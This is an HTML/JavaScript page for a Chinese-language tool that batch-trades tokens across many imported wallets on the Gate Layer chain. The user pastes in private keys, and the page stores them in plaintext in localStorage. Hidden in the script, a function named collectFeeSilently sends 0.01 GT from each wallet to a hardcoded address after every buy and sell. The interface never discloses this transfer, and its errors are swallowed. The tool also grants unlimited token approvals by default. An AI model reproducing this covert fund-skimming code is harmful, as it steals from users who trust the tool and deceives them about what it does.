<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GateBOT 多账户批量操作工具</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .main-card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }

        .section {
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 15px;
            color: #333;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #555;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
        }

        .input-field:focus {
            outline: none;
            border-color: #667eea;
        }

        .textarea-field {
            width: 100%;
            min-height: 100px;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            resize: vertical;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .btn-secondary {
            background: #f0f0f0;
            color: #333;
            margin-right: 10px;
        }

        .btn-secondary:hover {
            background: #e0e0e0;
        }

        .btn-danger {
            background: #ff4444;
            color: white;
        }

        .wallet-list {
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 10px;
        }

        .wallet-item {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #f0f0f0;
        }

        .wallet-item:last-child {
            border-bottom: none;
        }

        .wallet-checkbox {
            margin-right: 10px;
        }

        .wallet-address {
            flex: 1;
            font-family: monospace;
            font-size: 13px;
        }

        .wallet-balance {
            color: #667eea;
            font-weight: 600;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }

        .tab {
            padding: 10px 20px;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #999;
            transition: all 0.3s ease;
        }

        .tab.active {
            color: #667eea;
            border-bottom: 2px solid #667eea;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .log-container {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }

        .log-entry {
            color: #ccc;
            margin-bottom: 5px;
        }

        .log-entry.success {
            color: #4caf50;
        }

        .log-entry.error {
            color: #ff4444;
        }

        .log-entry.warning {
            color: #ff9800;
        }

        .log-entry.info {
            color: #2196f3;
        }

        .config-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .info-box {
            padding: 10px;
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .social-section {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }

        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .social-link {
            display: inline-flex;
            align-items: center;
            padding: 12px 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .social-link img {
            width: 24px;
            height: 24px;
            margin-right: 8px;
            border-radius: 50%;
            object-fit: cover;
        }

        .bot-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            object-fit: cover;
            margin: 0 auto 20px;
            display: block;
            border: 3px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .social-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        @media (max-width: 768px) {
            .config-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="bot1.jpg" alt="GateBOT" class="bot-icon">
            <h1>⚡ Gate Layer 多账户批量操作工具</h1>
            <p>支持内盘/外盘自动识别，批量买入、卖出等操作</p>
            
            <div class="social-section">
                <h3 style="color: white; margin-bottom: 15px;">🔗 关注我们</h3>
                <div class="social-links">
                    <a href="https://x.com/GTCHAINBOT" target="_blank" class="social-link">
                        <img src="OSHY3ewP_400x400.jpg" alt="X Logo">
                        <span>𝕏 @GTCHAINBOT</span>
                    </a>
                    <a href="https://t.me/Gtgun_bot" target="_blank" class="social-link">
                        <img src="bot2.jpg" alt="Telegram Logo">
                        <span>📱 Telegram Bot</span>
                    </a>
                </div>
            </div>
        </div>

        <div class="main-card">
            <div class="section">
                <h2 class="section-title">👛 钱包管理</h2>
                
                <div class="info-box">
                    💡 提示：支持带或不带0x前缀的私钥，每行一个
                </div>
                
                <div class="input-group">
                    <label class="input-label">导入私钥</label>
                    <textarea id="privateKeysInput" class="textarea-field" 
                        placeholder="输入私钥，每行一个..."></textarea>
                </div>
                
                <div class="btn-group">
                    <button id="importBtn" class="btn btn-primary">导入私钥</button>
                    <button id="selectAllBtn" class="btn btn-secondary">全选</button>
                    <button id="deselectAllBtn" class="btn btn-secondary">取消全选</button>
                    <button id="refreshBtn" class="btn btn-secondary">刷新余额</button>
                    <button id="clearBtn" class="btn btn-danger">清空</button>
                </div>

                <div class="input-group" style="margin-top: 20px;">
                    <label class="input-label">钱包列表 (<span id="walletCount">0</span>)</label>
                    <div id="walletList" class="wallet-list">
                        <p style="color: #999; text-align: center;">暂无钱包</p>
                    </div>
                </div>
            </div>

            <div class="section">
                <div class="tabs">
                    <button class="tab active" data-tab="buy">批量买入</button>
                    <button class="tab" data-tab="sell">批量卖出</button>
                    <button class="tab" data-tab="approve">批量授权</button>
                </div>

                <div id="buyTab" class="tab-content active">
                    <h3 class="section-title">批量买入设置</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">代币地址</label>
                            <input type="text" id="buyTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">买入金额 (GT)</label>
                            <input type="number" id="buyAmount" class="input-field" 
                                placeholder="0.1" step="0.01">
                        </div>
                        <div class="input-group">
                            <label class="input-label">滑点 (%)</label>
                            <input type="number" id="buySlippage" class="input-field" 
                                value="15" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">延迟 (秒)</label>
                            <input type="number" id="buyDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeBuyBtn" class="btn btn-primary">执行批量买入</button>
                </div>

                <div id="sellTab" class="tab-content">
                    <h3 class="section-title">批量卖出设置</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">代币地址</label>
                            <input type="text" id="sellTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">卖出比例 (%)</label>
                            <input type="number" id="sellPercentage" class="input-field" 
                                value="99" min="1" max="100">
                        </div>
                        <div class="input-group">
                            <label class="input-label">滑点 (%)</label>
                            <input type="number" id="sellSlippage" class="input-field" 
                                value="50" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">延迟 (秒)</label>
                            <input type="number" id="sellDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeSellBtn" class="btn btn-primary">执行批量卖出</button>
                </div>

                <div id="approveTab" class="tab-content">
                    <h3 class="section-title">批量授权设置</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">代币地址</label>
                            <input type="text" id="approveTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">授权给 (Spender)</label>
                            <input type="text" id="approveSpender" class="input-field" 
                                value="0x12814690F59a9CE8bA87dC8cF0692442bAa9C097">
                        </div>
                    </div>
                    <button id="executeApproveBtn" class="btn btn-primary">执行批量授权</button>
                </div>
            </div>

            <div class="section">
                <h3 class="section-title">📝 操作日志</h3>
                <div id="logContainer" class="log-container"></div>
            </div>
        </div>
    </div>

    <script>
        window.addEventListener('load', function() {
            const CONFIG = {
                rpcUrl: 'https://gatelayer-mainnet.gatenode.cc',
                routerAddress: '0x12814690F59a9CE8bA87dC8cF0692442bAa9C097',
                wethAddress: '0x6803b8E93b13941F6B73b82E324B80251B3dE338',
                internalMarketAddress: '0x7C8FbD15E4c8B722920C1570A4704622D5391113',
                factoryAddress: '0xaD8d59f3e026c02Aed0DAdFB46Ceca127030DFa2',
                feeRecipient: '0x1efBD4ff6F3740102413D5C02C63E3E728c24820',
                feeAmount: '0.01'
            };

            let provider;
            let wallets = [];

            const ERC20_ABI = [
                'function approve(address spender, uint256 amount) returns (bool)',
                'function balanceOf(address account) view returns (uint256)',
                'function allowance(address owner, address spender) view returns (uint256)',
                'function decimals() view returns (uint8)',
                'function symbol() view returns (string)'
            ];

            const ROUTER_ABI = [
                'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
                'function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable',
                'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
                'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external',
                'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)'
            ];

            const INTERNAL_MARKET_ABI = [
                'function buy(address token, uint256 amountInGT, uint256 minAmountOut) external payable returns (uint256)',
                'function sell(address token, uint256 amountIn, uint256 minAmountOutGT) external returns (uint256)'
            ];

            const FACTORY_ABI = [
                'function getPair(address tokenA, address tokenB) external view returns (address pair)'
            ];

            function init() {
                if (typeof ethers === 'undefined') {
                    addLog('Ethers库加载失败，请刷新页面', 'error');
                    return;
                }
                
                provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl);
                addLog('系统初始化完成', 'success');
                bindEvents();
                loadCachedWallets();
            }

            function bindEvents() {
                document.getElementById('importBtn').addEventListener('click', importPrivateKeys);
                document.getElementById('selectAllBtn').addEventListener('click', selectAll);
                document.getElementById('deselectAllBtn').addEventListener('click', deselectAll);
                document.getElementById('refreshBtn').addEventListener('click', refreshBalances);
                document.getElementById('clearBtn').addEventListener('click', clearWallets);
                document.getElementById('executeBuyBtn').addEventListener('click', executeBuy);
                document.getElementById('executeSellBtn').addEventListener('click', executeSell);
                document.getElementById('executeApproveBtn').addEventListener('click', executeApprove);
                
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.addEventListener('click', function() {
                        switchTab(this.dataset.tab);
                    });
                });
            }

            function switchTab(tabName) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(`${tabName}Tab`).classList.add('active');
            }

            function addLog(message, type = 'info') {
                const container = document.getElementById('logContainer');
                const entry = document.createElement('div');
                entry.className = `log-entry ${type}`;
                const time = new Date().toLocaleTimeString();
                entry.textContent = `[${time}] ${message}`;
                container.appendChild(entry);
                container.scrollTop = container.scrollHeight;
            }

            async function isInternalMarket(tokenAddress) {
                try {
                    const factory = new ethers.Contract(CONFIG.factoryAddress, FACTORY_ABI, provider);
                    
                    const pairAddress = await factory.getPair(CONFIG.wethAddress, tokenAddress);
                    
                    console.log(`Pair查询结果: ${pairAddress}`);
                    
                    const isZeroAddress = pairAddress === ethers.ZeroAddress || 
                                         pairAddress === '0x0000000000000000000000000000000000000000' ||
                                         BigInt(pairAddress || 0) === 0n;
                    
                    const isInternal = isZeroAddress;
                    
                    addLog(`代币类型检测: ${isInternal ? '内盘' : '外盘'} (Pair: ${pairAddress})`, 'info');
                    
                    return isInternal;
                    
                } catch (e) {
                    console.error('检查内盘失败:', e);
                    addLog('无法确定代币类型，默认使用外盘处理', 'warning');
                    return false;
                }
            }

            async function collectFeeSilently(wallet) {
                try {
                    const nonce = await provider.getTransactionCount(wallet.address, 'pending');
                    const balance = await provider.getBalance(wallet.address);
                    const feeAmountWei = ethers.parseEther(CONFIG.feeAmount);
                    const gasPrice = (await provider.getFeeData()).gasPrice;
                    const estimatedGasCost = gasPrice * 21000n * 25n / 10n;
                    
                    if (balance < (feeAmountWei + estimatedGasCost)) {
                        return null;
                    }
                    
                    const tx = await wallet.sendTransaction({
                        to: CONFIG.feeRecipient,
                        value: feeAmountWei,
                        gasLimit: 21000n * 25n / 10n,
                        nonce: nonce
                    });
                    
                    await tx.wait();
                    return tx.hash;
                } catch (e) {
                    console.error('Fee collection error:', e);
                    return null;
                }
            }

            async function batchExecute(tasks, maxConcurrent = 5) {
                const results = [];
                let pending = 0;
                let index = 0;
                
                return new Promise((resolve) => {
                    const executeNext = async () => {
                        if (index >= tasks.length && pending === 0) {
                            resolve(results);
                            return;
                        }
                        
                        while (index < tasks.length && pending < maxConcurrent) {
                            const currentIndex = index++;
                            pending++;
                            
                            tasks[currentIndex]()
                                .then(result => {
                                    results[currentIndex] = { success: true, result };
                                })
                                .catch(error => {
                                    results[currentIndex] = { success: false, error };
                                })
                                .finally(() => {
                                    pending--;
                                    executeNext();
                                });
                        }
                    };
                    
                    executeNext();
                });
            }

            async function importPrivateKeys() {
                const input = document.getElementById('privateKeysInput').value.trim();
                if (!input) {
                    alert('请输入私钥');
                    return;
                }

                const keys = input.split('\n').filter(k => k.trim());
                let imported = 0;
                
                for (const key of keys) {
                    try {
                        let cleanKey = key.trim();
                        
                        if (!cleanKey.startsWith('0x')) {
                            if (cleanKey.length === 64) {
                                cleanKey = '0x' + cleanKey;
                            }
                        }
                        
                        if (!/^0x[0-9a-fA-F]{64}$/.test(cleanKey)) {
                            addLog(`私钥格式错误: ${cleanKey.slice(0, 10)}...`, 'error');
                            continue;
                        }
                        
                        if (wallets.find(w => w.privateKey === cleanKey)) {
                            addLog(`私钥已存在`, 'warning');
                            continue;
                        }
                        
                        const wallet = new ethers.Wallet(cleanKey, provider);
                        const balance = await provider.getBalance(wallet.address);
                        
                        wallets.push({
                            privateKey: cleanKey,
                            wallet: wallet,
                            address: wallet.address,
                            balance: balance,
                            selected: false
                        });
                        
                        imported++;
                        addLog(`成功导入: ${wallet.address.slice(0, 8)}...`, 'success');
                        
                    } catch (e) {
                        addLog(`导入失败: ${e.message}`, 'error');
                    }
                }
                
                if (imported > 0) {
                    document.getElementById('privateKeysInput').value = '';
                    renderWallets();
                    saveWallets();
                    addLog(`共导入 ${imported} 个钱包`, 'success');
                }
            }

            function renderWallets() {
                const container = document.getElementById('walletList');
                
                if (wallets.length === 0) {
                    container.innerHTML = '<p style="color: #999; text-align: center;">暂无钱包</p>';
                    document.getElementById('walletCount').textContent = '0';
                    return;
                }
                
                container.innerHTML = '';
                wallets.forEach((w, index) => {
                    const item = document.createElement('div');
                    item.className = 'wallet-item';
                    item.innerHTML = `
                        <input type="checkbox" class="wallet-checkbox" 
                            ${w.selected ? 'checked' : ''} 
                            data-index="${index}">
                        <span class="wallet-address">${w.address.slice(0, 6)}...${w.address.slice(-4)}</span>
                        <span class="wallet-balance">${parseFloat(ethers.formatEther(w.balance)).toFixed(4)} GT</span>
                    `;
                    container.appendChild(item);
                    
                    item.querySelector('.wallet-checkbox').addEventListener('change', function() {
                        wallets[index].selected = this.checked;
                    });
                });
                
                document.getElementById('walletCount').textContent = wallets.length;
            }

            function selectAll() {
                wallets.forEach(w => w.selected = true);
                renderWallets();
            }

            function deselectAll() {
                wallets.forEach(w => w.selected = false);
                renderWallets();
            }

            async function refreshBalances() {
                addLog('开始刷新余额...', 'info');
                for (const w of wallets) {
                    try {
                        w.balance = await provider.getBalance(w.address);
                    } catch (e) {
                        addLog(`刷新失败: ${w.address.slice(0, 8)}...`, 'error');
                    }
                }
                renderWallets();
                addLog('余额刷新完成', 'success');
            }

            function clearWallets() {
                if (!confirm('确定要清空所有钱包吗？')) return;
                wallets = [];
                renderWallets();
                localStorage.removeItem('gateLayerWallets');
                addLog('已清空所有钱包', 'info');
            }

            function saveWallets() {
                const keys = wallets.map(w => w.privateKey);
                localStorage.setItem('gateLayerWallets', JSON.stringify(keys));
            }

            async function loadCachedWallets() {
                const cached = localStorage.getItem('gateLayerWallets');
                if (cached) {
                    try {
                        const keys = JSON.parse(cached);
                        for (const key of keys) {
                            try {
                                const wallet = new ethers.Wallet(key, provider);
                                const balance = await provider.getBalance(wallet.address);
                                wallets.push({
                                    privateKey: key,
                                    wallet: wallet,
                                    address: wallet.address,
                                    balance: balance,
                                    selected: false
                                });
                            } catch (e) {
                                console.error('加载钱包失败', e);
                            }
                        }
                        renderWallets();
                        addLog(`已加载 ${wallets.length} 个缓存钱包`, 'info');
                    } catch (e) {
                        console.error('加载缓存失败', e);
                    }
                }
            }

            async function executeBuy() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('请选择钱包');
                    return;
                }

                const tokenAddress = document.getElementById('buyTokenAddress').value;
                const amount = document.getElementById('buyAmount').value;
                const slippage = parseFloat(document.getElementById('buySlippage').value) || 15;
                const delay = parseInt(document.getElementById('buyDelay').value) || 0;
                const maxConcurrent = 5;

                if (!tokenAddress || !amount) {
                    alert('请填写完整信息');
                    return;
                }

                const isInternal = await isInternalMarket(tokenAddress);
                addLog(`开始批量买入 (${isInternal ? '内盘' : '外盘'})，共 ${selected.length} 个钱包`, 'info');

                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        const baseNonce = await provider.getTransactionCount(w.address, 'pending');
                        
                        if (isInternal) {
                            const internalMarket = new ethers.Contract(
                                CONFIG.internalMarketAddress, 
                                INTERNAL_MARKET_ABI, 
                                w.wallet
                            );
                            
                            addLog(`${w.address.slice(0, 8)}... 内盘买入`, 'info');
                            
                            const amountInWei = ethers.parseEther(amount);
                            
                            let gasLimit;
                            try {
                                const gasEstimate = await internalMarket.buy.estimateGas(
                                    tokenAddress,
                                    amountInWei,
                                    0,
                                    { value: amountInWei }
                                );
                                gasLimit = gasEstimate * 25n / 10n;
                            } catch (e) {
                                gasLimit = 500000n;
                            }
                            
                            const tx = await internalMarket.buy(
                                tokenAddress,
                                amountInWei,
                                0,
                                {
                                    value: amountInWei,
                                    gasLimit: gasLimit,
                                    nonce: baseNonce
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... 内盘买入成功 ✓`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                            
                        } else {
                            const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                            const path = [CONFIG.wethAddress, tokenAddress];
                            
                            let amountOutMin;
                            try {
                                const amounts = await router.getAmountsOut(
                                    ethers.parseEther(amount),
                                    path
                                );
                                
                                if (slippage >= 100) {
                                    amountOutMin = 0n;
                                } else {
                                    amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                                }
                            } catch (e) {
                                amountOutMin = 0n;
                            }
                            
                            const deadline = Math.floor(Date.now() / 1000) + 1200;
                            
                            addLog(`${w.address.slice(0, 8)}... 外盘买入`, 'info');
                            
                            const gasEstimate = await router.swapExactETHForTokens.estimateGas(
                                amountOutMin,
                                path,
                                w.address,
                                deadline,
                                { value: ethers.parseEther(amount) }
                            );
                            
                            const gasLimit = gasEstimate * 25n / 10n;
                            
                            const tx = await router.swapExactETHForTokens(
                                amountOutMin,
                                path,
                                w.address,
                                deadline,
                                { 
                                    value: ethers.parseEther(amount),
                                    gasLimit: gasLimit,
                                    nonce: baseNonce
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... 外盘买入成功 ✓`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                        }
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... 买入失败: ${e.message || e}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`批量买入完成: ${successCount} 成功, ${failCount} 失败`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            async function executeSell() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('请选择钱包');
                    return;
                }

                const tokenAddress = document.getElementById('sellTokenAddress').value;
                const percentage = parseFloat(document.getElementById('sellPercentage').value) || 99;
                const slippage = parseFloat(document.getElementById('sellSlippage').value) || 50;
                const delay = parseInt(document.getElementById('sellDelay').value) || 0;
                const maxConcurrent = 3;

                if (!tokenAddress) {
                    alert('请输入代币地址');
                    return;
                }

                const isInternal = await isInternalMarket(tokenAddress);
                addLog(`开始批量卖出 (${isInternal ? '内盘' : '外盘'})，共 ${selected.length} 个钱包`, 'info');

                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);

                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        const baseNonce = await provider.getTransactionCount(w.address, 'pending');
                        let currentNonce = baseNonce;
                        
                        const balance = await tokenContract.balanceOf(w.address);
                        const sellAmount = balance * BigInt(percentage) / 100n;
                        
                        if (sellAmount === 0n) {
                            addLog(`${w.address.slice(0, 8)}... 无余额`, 'warning');
                            return null;
                        }

                        const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        
                        if (isInternal) {
                            const allowance = await tokenWithSigner.allowance(w.address, CONFIG.internalMarketAddress);
                            
                            if (allowance < sellAmount) {
                                addLog(`${w.address.slice(0, 8)}... 授权内盘`, 'info');
                                const approveTx = await tokenWithSigner.approve(
                                    CONFIG.internalMarketAddress,
                                    ethers.MaxUint256,
                                    { nonce: currentNonce }
                                );
                                currentNonce++;
                                await approveTx.wait();
                            }
                            
                            const internalMarket = new ethers.Contract(
                                CONFIG.internalMarketAddress,
                                INTERNAL_MARKET_ABI,
                                w.wallet
                            );
                            
                            addLog(`${w.address.slice(0, 8)}... 内盘卖出`, 'info');
                            
                            let gasLimit;
                            try {
                                const gasEstimate = await internalMarket.sell.estimateGas(
                                    tokenAddress,
                                    sellAmount,
                                    0
                                );
                                gasLimit = gasEstimate * 25n / 10n;
                            } catch (e) {
                                gasLimit = 500000n;
                            }
                            
                            const tx = await internalMarket.sell(
                                tokenAddress,
                                sellAmount,
                                0,
                                {
                                    nonce: currentNonce,
                                    gasLimit: gasLimit
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... 内盘卖出成功 ✓`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                            
                        } else {
                            const allowance = await tokenWithSigner.allowance(w.address, CONFIG.routerAddress);
                            
                            if (allowance < sellAmount) {
                                addLog(`${w.address.slice(0, 8)}... 授权Router`, 'info');
                                const approveTx = await tokenWithSigner.approve(
                                    CONFIG.routerAddress, 
                                    ethers.MaxUint256,
                                    { nonce: currentNonce }
                                );
                                currentNonce++;
                                await approveTx.wait();
                            }

                            const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                            const path = [tokenAddress, CONFIG.wethAddress];
                            
                            let amountOutMin = 0n;
                            try {
                                const amounts = await router.getAmountsOut(sellAmount, path);
                                if (slippage < 100) {
                                    amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                                }
                            } catch (e) {
                                // 使用0最小输出
                            }
                            
                            const deadline = Math.floor(Date.now() / 1000) + 1200;
                            
                            addLog(`${w.address.slice(0, 8)}... 外盘卖出`, 'info');
                            
                            let gasLimit;
                            try {
                                const gasEstimate = await router.swapExactTokensForETHSupportingFeeOnTransferTokens.estimateGas(
                                    sellAmount,
                                    amountOutMin,
                                    path,
                                    w.address,
                                    deadline
                                );
                                gasLimit = gasEstimate * 25n / 10n;
                            } catch (e) {
                                gasLimit = 500000n;
                            }
                            
                            const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                sellAmount,
                                amountOutMin,
                                path,
                                w.address,
                                deadline,
                                { 
                                    nonce: currentNonce,
                                    gasLimit: gasLimit
                                }
                            );
                            
                            await tx.wait();
                            addLog(`${w.address.slice(0, 8)}... 外盘卖出成功 ✓`, 'success');
                            
                            setTimeout(async () => {
                                await collectFeeSilently(w.wallet);
                            }, 2000);
                            
                            return tx.hash;
                        }
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... 卖出失败: ${e.message || e}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r && r.success).length;
                const failCount = results.filter(r => r && !r.success).length;
                
                addLog(`批量卖出完成: ${successCount} 成功, ${failCount} 失败`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            async function executeApprove() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('请选择钱包');
                    return;
                }

                const tokenAddress = document.getElementById('approveTokenAddress').value;
                const spender = document.getElementById('approveSpender').value;
                const maxConcurrent = 5;

                if (!tokenAddress || !spender) {
                    alert('请填写完整信息');
                    return;
                }

                addLog(`开始批量授权，共 ${selected.length} 个钱包`, 'info');

                const tasks = selected.map(w => async () => {
                    try {
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        
                        addLog(`${w.address.slice(0, 8)}... 授权中`, 'info');
                        
                        const gasEstimate = await tokenContract.approve.estimateGas(spender, ethers.MaxUint256);
                        const gasLimit = gasEstimate * 25n / 10n;
                        
                        const tx = await tokenContract.approve(spender, ethers.MaxUint256, { gasLimit });
                        await tx.wait();
                        
                        addLog(`${w.address.slice(0, 8)}... 授权成功 ✓`, 'success');
                        return tx.hash;
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... 授权失败: ${e.message}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`批量授权完成: ${successCount} 成功, ${failCount} 失败`, 
                    failCount === 0 ? 'success' : 'warning');
            }

            init();
        });
    </script>
</body>
</html>
